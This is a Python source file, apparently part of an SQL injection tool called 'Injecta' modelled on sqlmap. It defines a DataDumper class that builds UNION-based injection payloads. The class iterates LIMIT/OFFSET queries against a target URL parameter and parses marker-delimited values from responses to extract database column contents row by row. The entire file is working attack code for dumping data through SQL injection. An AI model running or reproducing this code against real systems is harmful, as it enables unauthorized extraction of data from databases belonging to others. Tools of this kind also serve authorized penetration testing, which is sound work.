"""
Injecta — Data dumping (sqlmap-style extraction with multi-row iteration)
"""
from typing import Any, Dict, List
from injecta.enum.extract import (build_union_payload, extract_with_marker,
                                    extract_orig_val, SQL_ERROR_PATTERNS, MARKER)


class DataDumper:
    def __init__(self, requester, config, logger, payloads, injection_info: Dict[str, Any]):
        self.req = requester
        self.config = config
        self.log = logger
        self.payloads = payloads
        self.info = injection_info
        self.dbms = getattr(payloads, "name", "") if payloads else ""

    def dump(self, url: str, param: str, db: str, table: str, column: str) -> List[str]:
        cols = self.info.get("column_count", 1)
        pos = self.info.get("data_pos", 1)
        queries = self.payloads.dump_column(db, table, column)
        orig_val = extract_orig_val(url, param)

        for q in queries:
            results = []
            for offset in range(100):
                row = self._extract_row(url, param, q, cols, pos, offset, orig_val)
                if row is None:
                    break
                if not row:
                    continue
                results.append(row)
            if results:
                return results
        return []

    def _extract_row(self, url: str, param: str, sql: str,
                     col_count: int, data_pos: int, offset: int = 0, orig_val: str = ""):
        limit_sql = f"{sql} LIMIT 1 OFFSET {offset}"
        payload = build_union_payload(limit_sql, col_count, data_pos,
                                       MARKER, self.dbms, orig_val)
        try:
            _, resp_text, _ = self.req.test_raw(url, payload, param)
        except:
            return None

        if not resp_text:
            return None

        if SQL_ERROR_PATTERNS.search(resp_text[:500]):
            if offset == 0:
                return None
            return ""

        parts = resp_text.split(MARKER)
        for i in range(1, len(parts), 2):
            val = parts[i].strip()
            if val and len(val) < 10000:
                return val
        return ""
